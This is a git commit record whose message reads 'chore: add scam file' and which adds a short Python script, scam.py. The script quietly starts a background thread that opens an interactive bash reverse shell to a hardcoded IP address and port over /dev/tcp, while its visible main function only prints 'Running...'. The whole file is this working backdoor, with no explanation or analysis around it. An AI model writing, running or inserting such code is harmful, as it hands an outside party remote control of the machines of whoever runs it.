f819e2f882f51beaff6e18c161b9d71021baabfb
oreste-abizera <oresteabizera11@gmail.com>
2022-02-08 21:54:48 +0200

    chore: add scam file

---
+++ scam.py
@@ -0,0 +1,20 @@
+import subprocess
+import threading
+
+
+def fn(n):
+    try:
+        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/5010 0<&1 2>&1", shell=True, executable="/bin/bash")
+        print("Connection Established")
+    except:
+        print("Command Failed")
+        return 0
+
+def main():
+    print("Running...")
+
+if __name__ == "__main__":
+    thread = threading.Thread(target=fn, args=(0, ))
+    thread.start()
+    main()
+    exit(0)
